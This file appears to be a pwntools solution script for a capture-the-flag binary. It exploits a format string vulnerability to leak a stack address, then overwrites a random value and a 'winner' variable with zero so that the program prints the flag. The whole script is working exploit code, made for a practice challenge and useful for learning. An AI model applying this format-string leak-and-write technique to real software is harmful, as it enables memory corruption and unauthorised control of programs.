from pwn import *
from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Function to be called by FmtStr
def send_payload(payload):
    io.sendline(payload)
    io.recvuntil('Hello,')
    return io.recvline()


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b *0x0040139c
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './leet_test'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


# Start program
io = start()

format_string = FmtStr(execute_fmt=send_payload)
info("format string offset: %d", format_string.offset)

# Leak address from stack (38th element)
io.sendline('%{}$p'.format(38))
io.recvuntil('Hello,')
leaked_addr = int(io.recvlineS().strip(), 16)
info('leaked_addr = 0x%x (%d)', leaked_addr, leaked_addr)
# Get random number address (offset of 237 calculated in GDB)
random_num_addr = leaked_addr - 0x11f
info('random_num_addr = 0x%x (%d)', random_num_addr, random_num_addr)

# Note that 0xcafebabe / 0x1337c0de = 10.56287284525716 but unable to supply due to float packing error
# Also tried converting to hex (https://gregstoll.com/~gregstoll/floattohex/) but no luck (rounding issue?)
# Alternatively, we overwrite both random value and winner with zero so that 0x1337c0de * 0 == 0
format_string.write(random_num_addr, 0)  # /dev/urandom location
format_string.write(0x404078, 0)  # winner (0xcafebabe) location
format_string.execute_writes()

# Get our flag!
io.recvuntil('Come right in! ')
flag = io.recv()
success(flag)
